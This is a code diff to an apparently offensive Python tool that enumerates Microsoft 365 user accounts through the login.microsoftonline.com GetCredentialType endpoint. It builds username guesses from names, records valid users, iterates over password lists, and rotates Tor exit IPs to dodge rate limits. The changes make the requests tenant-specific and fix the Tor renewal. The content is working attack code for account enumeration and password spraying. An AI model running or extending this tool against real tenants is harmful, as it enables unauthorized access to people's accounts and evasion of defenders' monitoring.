@@ -96,7 +96,7 @@ if args.firstname and args.lastname:
     combos = generate_combinations(args.firstname, args.lastname)
 
 proxies = None
-
+last_ip_renewal = None
 def get_tor_ip():
     try:
         with httpx.Client(transport=transport, timeout=20) as client:
@@ -130,11 +130,18 @@ if args.proxytor:
     renew_interval = 240
     proxies = "socks5h://127.0.0.1:9050"
     transport = httpx.HTTPTransport(proxy=proxies)
-    get_tor_ip()  
+    renew_tor_ip()  
     
         
 with open("valid-users.txt", "w") as f:
     pass
+
+def get_domain_name(first_email):
+    if "@" in first_email:
+        domain = first_email.split("@")[1]
+        return domain
+    else:
+        return None
 
 def get_tenant_id(first_email):      
     if "@" in first_email:
@@ -544,6 +551,8 @@ if args.user and args.check and args.password is None and args.firstname is None
         print("--------------------------------")
         print(" ")
         
+    DomainName = get_domain_name(user)
+    
     for username in usernames:
         if args.proxytor and transport and time.time() - last_ip_renewal >= renew_interval:
             renew_tor_ip()
@@ -686,7 +695,7 @@ if args.user and args.check and args.password is None and args.firstname is None
                 
                 
             # Reques 4 Checking if user is exsit: (With Tor Proxy) :]
-            url_UserExsit = "https://login.microsoftonline.com/common/GetCredentialType"
+            url_UserExsit = f"https://login.microsoftonline.com/{DomainName}/GetCredentialType"
             headers_UserExsit = {
                 "Host": "login.microsoftonline.com",
                 "Sec-Ch-Ua-Platform": '"Windows"',
@@ -882,7 +891,7 @@ if args.user and args.check and args.password is None and args.firstname is None
                 
                 
             # Reques 4 Checking if user is exsit: (With-out Tor Proxy) :]
-            url_UserExsit = "https://login.microsoftonline.com/common/GetCredentialType"
+            url_UserExsit = f"https://login.microsoftonline.com/{DomainName}/GetCredentialType"
             headers_UserExsit = {
                 "Host": "login.microsoftonline.com",
                 "Sec-Ch-Ua-Platform": '"Windows"',
@@ -952,7 +961,9 @@ if args.password:
         print(f"{BOLD_YELLOW}Tenant ID Found: {Tenant}{RESET}")
         print("--------------------------------")
         print(" ")
-        
+    
+    DomainName = get_domain_name(user)
+    
     for username in usernames:
         for password in passwords:
             if args.proxytor and time.time() - last_ip_renewal >= renew_interval:
@@ -1098,7 +1109,7 @@ if args.password:
                 
 
                 # Reques 4 Checking if user is exsit: (With Tor Proxy) :]
-                url_UserExsit = "https://login.microsoftonline.com/common/GetCredentialType"
+                url_UserExsit = f"https://login.microsoftonline.com/{DomainName}/GetCredentialType"
                 headers_UserExsit = {
                     "Host": "login.microsoftonline.com",
                     "Sec-Ch-Ua-Platform": '"Windows"',
@@ -1412,7 +1423,7 @@ if args.password:
                 
                 
                 #Check id User Exist:
-                url_UserExsit = "https://login.microsoftonline.com/common/GetCredentialType"
+                url_UserExsit = f"https://login.microsoftonline.com/{DomainName}/GetCredentialType"
                 headers_UserExsit = {
                     "Host": "login.microsoftonline.com",
                     "Sec-Ch-Ua-Platform": '"Windows"',
